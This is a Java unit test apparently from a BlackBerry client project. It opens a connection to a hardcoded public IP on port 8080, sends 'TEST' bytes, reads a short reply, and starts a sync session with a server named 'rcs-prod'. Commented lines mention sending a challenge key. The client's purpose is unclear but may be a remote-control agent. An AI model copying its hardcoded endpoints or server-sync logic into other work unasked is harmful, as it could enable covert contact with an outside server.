package tests.unit;

import java.io.IOException;

import tests.AssertException;
import tests.TestUnit;
import tests.Tests;
import tests.accessor.TransferAccessor;
import blackberry.config.Keys;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.transfer.CHttpConnection;
import blackberry.transfer.DirectTcpConnection;
import blackberry.utils.Utils;

public class UT_HTTPConnection extends TestUnit {
    //#ifdef DEBUG
    static Debug debug = new Debug("UT_HTTPConn", DebugLevel.VERBOSE);

    //#endif

    String host = "rcs-prod";
    TransferAccessor transfer;
    int port;

    public UT_HTTPConnection(String name, Tests tests) {
        super(name, tests);
        transfer = new TransferAccessor();

    }

    private void ConnectionRemoteTest() throws AssertException {
        //#ifdef DEBUG_INFO
        debug.info("- ConnectionRemoteTest -");
        //#endif
        final String remoteHost = "93.62.139.39";
        port = 8080;
        
        final CHttpConnection connection = new CHttpConnection(
                remoteHost, port, true, 0);
        final boolean connected = connection.connect();
        AssertThat(connected, "not connected");

        try {
            //#ifdef DEBUG_TRACE
            debug.trace("send");
            //#endif
            // connection.send("HelloWorld".getBytes());
            boolean ret = connection.send("TEST".getBytes());  
                    
                   // Keys.getInstance().getChallengeKey());
            AssertThat(ret, "cannot send 1");
                                   
            connection.disconnect();
            connection.connect();
            
            ret = connection.send("TEST".getBytes());  
            
            // Keys.getInstance().getChallengeKey());
            AssertThat(ret, "cannot send 2");
            
            connection.disconnect();
            connection.connect();
            
            //#ifdef DEBUG_TRACE
            debug.trace("receive");
            //#endif
            
            //#ifdef DEBUG_TRACE
            debug.trace("reconnected");
            //#endif
            final byte[] rec = connection.receive(5);
            final String string = new String(rec);
            //#ifdef DEBUG_TRACE
            debug.trace("Received: " + string);
            //#endif
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
        }

        connection.disconnect();
    }
    
    private void SyncTest() throws AssertException {
        //#ifdef DEBUG_INFO
        debug.info("- SyncTest -");
        //#endif
        transfer.init(host, port, false, true, true, false);

        //#ifdef DEBUG_INFO
        debug.info("transfer sending");

        //#endif
        final boolean ret = transfer.startSession();
        AssertThat(ret == true, "Doesn't send transfer");

    }
    
    public boolean run() throws AssertException {
        ConnectionRemoteTest();
        Utils.sleep(2000);
        SyncTest();
        return true;
    }
}
